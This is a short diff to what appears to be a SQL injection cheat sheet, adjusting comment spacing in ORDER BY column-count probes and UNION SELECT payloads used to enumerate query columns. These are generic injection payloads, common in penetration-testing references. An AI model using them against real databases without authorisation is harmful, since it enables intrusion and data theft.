@@ -8,11 +8,11 @@
 
 ```bash
 # when error; available columns = N-1
-ORDER BY <N> --
+ORDER BY <N>--
 
 # union [all] select 
-UNION [ALL] SELECT 1,2,3,4 -- -
-UNION [ALL] SELECT NULL,NULL,NULL,NULL -- -
+UNION [ALL] SELECT 1,2,3,4-- -
+UNION [ALL] SELECT NULL,NULL,NULL,NULL-- -
 ```
 
 ## Using mysql-client
